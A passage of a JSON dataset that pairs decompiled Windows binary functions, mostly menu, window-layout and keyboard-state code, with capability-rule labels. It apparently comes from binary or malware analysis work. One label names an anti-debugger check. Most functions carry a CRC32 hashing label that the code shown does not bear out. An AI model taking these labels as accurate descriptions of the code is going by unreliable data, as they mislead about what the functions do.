        "decompiled_code": "\nvoid __fastcall fcn.00436a28(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x44) = 0;\n    }\n    else {\n        if (*(in_EAX + 0x44) == 0) {\n            iVar1 = fcn.0040484c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x44) = uVar2;\n        }\n        (**(**(in_EAX + 0x44) + 0xc))();\n        iVar1 = *(in_EAX + 0x44);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x436cc0;\n        fcn.0040484c();\n        fcn.00420098();\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00437bbc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00437bbc(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint pwszKLID;\n    uint var_ch;\n    uint hLibModule;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x437cef;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    pwszKLID._0_1_ = 0;\n    puStack56 = &fcn.00437bbc::pwszKLID;\n    puStack60 = 0x437be9;\n    sub.user32.dll_GetKeyboardLayoutNameA();\n    puStack60 = 0x437bf5;\n    var_ch = fcn.004216c4();\n    uStack64 = 0x437cc5;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x437c13;\n    puStack60 = &stack0xfffffffc;\n    fcn.004217a0();\n    puStack72 = 0x437c23;\n    fcn.004057a0();\n    puStack72 = 0x437c33;\n    fcn.00405864();\n    puStack72 = 0x437c3e;\n    fcn.00421a08();\n    puStack72 = 0x437c4e;\n    fcn.00422068();\n    puStack72 = 0x437c5b;\n    uVar1 = fcn.0040fa10();\n    uStack76 = 0x437ca8;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    hLibModule = uVar1;\n    pcVar2 = sub.kernel32.dll_GetProcAddress_1(uVar1, 0x437d4c);\n    iVar3 = (*pcVar2)();\n    *0x4924ec = (*(iVar3 + 0x28) & 1) == 1;\n    *in_FS_OFFSET = uVar1;\n    uStack80 = 0x437caf;\n    sub.kernel32.dll_FreeLibrary_1(hLibModule);\n    return;\n}\n",
        "token_count": 614
    },
    "00438108": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438108(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    puVar2 = arg_8h + -0x200;\n    iVar4 = 0;\n    while ((iVar4 < iVar1 && (puVar2 < arg_8h + -5))) {\n        fcn.00438710(0x400, (arg_8h + -5) - puVar2, puVar2);\n        puVar2 = fcn.0040a898();\n        uVar3 = sub.user32.dll_GetMenuState();\n        if ((uVar3 & 2) != 0) {\n            *puVar2 = 0x24;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 0x40) != 0) {\n            *puVar2 = 0x40;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 1) != 0) {\n            *puVar2 = 0x23;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        *puVar2 = 0x3b;\n        puVar2 = puVar2 + 1;\n        *puVar2 = 0;\n        iVar4 = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "004391ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004391ac(uint arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x494958 < 5) && ((**0x494958 != 4 || (**0x494b88 < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.0040484c();\n    cVar2 = fcn.004047dc();\n    if (((arg_8h & 1) == 0) || ((cVar2 != '\\0' && ((cVar2 == '\\0' || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.00424fb8();\n            fcn.004246fc();\n        }\n        else {\n            fcn.00424fb8();\n            fcn.004246fc();\n        }\n    }\n    else {\n        fcn.00424fb8();\n        fcn.004246fc();\n    }\n    (**(*in_EAX + 0x30))(cVar2, arg_8h);\n    return;\n}\n",
        "token_count": 284
    },
    "0043bbf8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.0043bbf8(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43bc4c;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = *0x43bc4c | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 254
    },
    "0043cf00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cf00(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x250) + 0x1e) = 1;\n            *(*(in_EAX + 0x254) + 0x1e) = 1;\n        }\n        fcn.0043c61c();\n        fcn.0043c61c();\n        if (*(in_EAX + 600) == '\\0') {\n            if (*(*(in_EAX + 0x250) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x250) + 0x10), param_2, param_1);\n                fcn.0043c76c();\n            }\n            if (*(*(in_EAX + 0x254) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x254) + 0x10), param_2, param_1);\n                fcn.0043c76c();\n            }\n        }\n    }\n    *(*(in_EAX + 0x250) + 0x1e) = 0;\n    *(*(in_EAX + 0x254) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 347
    },
    "0043e40c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e40c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x358) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.0043fdf4();\n        }\n        fcn.004507b4();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 2;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "00440ad0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440ad0(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x440b80;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x268)) goto code_r0x00440b6a;\n    puVar1 = &stack0xfffffffc;\n    if ((param_2 == 0) || (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0x1c) & 0x10) != 0)) goto code_r0x00440b43;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x00440b22:\n        puStack24 = puVar1;\n        fcn.00407550();\n        fcn.0040dafc();\n        fcn.00404ec4();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.0043bd4c();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x00440b22;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.0040484c();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x00440b22;\n        }\n    }\ncode_r0x00440b43:\n    puStack24 = puVar1;\n    *(in_EAX + 0x268) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x276) != '\\0') {\n            fcn.00440ea4();\n        }\n        fcn.0040484c();\n    }\ncode_r0x00440b6a:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x440b87;\n    uStack28 = 0x440b7f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 570
    },
    "0044155c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044155c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x271) != '\\0') && ((*(*(arg_8h + -4) + 0x270) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x277) != '\\x01')) {\n        uVar1 = fcn.004585f8(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x271) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x270) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x270) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "004435b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004435b0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044ff24();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff | param_2 << 0x10;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043fbe0();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "004435ec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004435ec(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044ff58();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff0000 | param_2 & 0xffff;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043fbe0();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00443694": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004436dd)\n// WARNING: Removing unreachable block (ram,0x004436fd)\n// WARNING: Removing unreachable block (ram,0x00443706)\n// WARNING: Removing unreachable block (ram,0x0044370b)\n// WARNING: Removing unreachable block (ram,0x00443718)\n// WARNING: Removing unreachable block (ram,0x0044371d)\n// WARNING: Removing unreachable block (ram,0x0044372a)\n\nvoid fcn.00443694(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x443774;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.00456fac();\n    if (iVar1 == 1) {\n        fcn.00450804();\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.00450814();\n        fcn.004508c4();\n    }\n    fcn.00456e10();\n    fcn.0044fc18();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.0043e40c();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44377b;\n    uStack32 = 0x443773;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 386
    },
    "00443b34": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00443b34(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint auStack40 [7];\n    uint8_t uStack12;\n    \n    auStack40[0] = 0x28;\n    uVar1 = (***0x494948)(*(in_EAX + 4), auStack40);\n    return uVar1 & 0xffffff00 | (uStack12 & 1) != 0;\n}\n",
        "token_count": 108
    },
    "0044f98c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f98c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x61)) {\n        cVar1 = *(in_EAX + 0x61);\n        *(in_EAX + 0x61) = param_2;\n        if ((*(in_EAX + 7) & 1) == 0) {\n            if (((*0x44fa28 == cVar1) || (*0x44fa28 != *(in_EAX + 0x61))) ||\n               ((in_EAX[0x60] == in_EAX[0x10] &&\n                (((in_EAX[0x61] == in_EAX[0x11] && (in_EAX[0x62] == in_EAX[0x12])) && (in_EAX[99] == in_EAX[0x13]))))))\n            {\n                fcn.0044fda0();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "0044fa2c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fa2c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.0040484c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x452f0c;\n        fcn.0040484c();\n        fcn.00420098();\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0044fc18": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fc18(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.0044f98c();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x88))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else if ((cVar1 == '\\0') || (param_2 != '\\0')) {\n                fcn.0040484c();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 349
    },
    "0044fd00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044fd00(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.00452590();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.00450cec();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.0044fda0();\n        fcn.0045342c();\n        (**(*in_EAX + 0x80))();\n        fcn.00451b4c(0);\n        (**(*in_EAX + 0x5c))();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0044fda0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0044fda0(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((*(in_EAX + 0x164) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        (**(**(in_EAX + 0x78) + 0x10))(iVar2 + iVar4);\n        (**(**(in_EAX + 0x78) + 0x10))();\n        fcn.00418420();\n        *(in_EAX + 0x16d) = uStack20;\n        *(in_EAX + 0x171) = uStack16;\n        if (*0x44ff20 == uVar1) {\n            *(in_EAX + 0x175) = 0;\n            *(in_EAX + 0x179) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x165) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 1) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x169) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 2) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            if (*(in_EAX + 0x30) != NULL) {\n                (**(**(in_EAX + 0x30) + 0xd0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 848
    },
    "0045017c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045017c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 1;\n    }\n    *(in_EAX + 0x160) = param_2;\n    return;\n}\n",
        "token_count": 91
    },
    "00450190": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00450190(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 0;\n    }\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 72
    },
    "0045049c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045049c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar2 = *0x450650;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar2 = *(in_EAX + 0x23);\n        }\n        if ((uVar2 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar2 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar2 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar2 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar3 = (uVar2 & 8) == 0;\n        if ((bVar3) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar3) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        fcn.00450350();\n        (**(*in_EAX + 0x88))(iStack32, in_stack_ffffffdc);\n        if (*0x450658 != (uVar2 & *0x450654)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x175), param_2, iStack32);\n            *(in_EAX + 0x175) = uVar1;\n        }\n        if (*0x450658 != (uVar2 & *0x45065c)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x179), param_2, iStack32);\n            *(in_EAX + 0x179) = uVar1;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar2 & 0x10) != 0)) {\n            uVar1 = fcn.00424a40(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar1);\n            fcn.00424a5c();\n        }\n    }\n    *(in_EAX + 0x23) = *0x450658;\n    return;\n}\n",
        "token_count": 814
    },
    "0045067c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0045067c(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450712;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.00450894();\n        fcn.00405974();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004047dc();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x004506de;\n            }\n            bVar2 = true;\n            goto code_r0x004506e4;\n        }\n    }\ncode_r0x004506de:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x004506e4:\n    fcn.00420534();\n    if (bVar2) {\n        fcn.004508c4();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x450719;\n    uStack32 = 0x450711;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 456
    },
    "00450b0c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450b0c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.004198f4();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1cc) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.0041978c();\n                fcn.00419914();\n                fcn.00450cec();\n                if ((*(in_EAX + 0x1c) & 1) == 0) {\n                    iVar2 = fcn.0043bda0();\n                    if ((*(iVar2 + 0x54) & 4) != 0) {\n                        fcn.0040484c();\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "00450fd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00450fd0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    cVar1 = fcn.0045d5a4();\n    if (cVar1 != '\\0') {\n        fcn.0045d664();\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x8f) != '\\x01')) {\n        fcn.0040dbb8();\n        fcn.00404ec4();\n    }\n    fcn.00451b80();\n    if ((*0x499c80 == 0) || (*0x499c80 == -1)) {\n        *0x499c80 = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&iStack32);\n            fcn.004503d4();\n            iStack32 = iStack20;\n            uStack28 = uStack24 & 0xffff | iStack20 << 0x10;\n            fcn.00451b4c(uStack28);\n        }\n        if (*0x499c80 != -1) {\n            fcn.0044e864();\n        }\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "00452954": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452954(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x452a00 == (*0x4529fc & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x25] != 0)) && ((*(in_EAX + 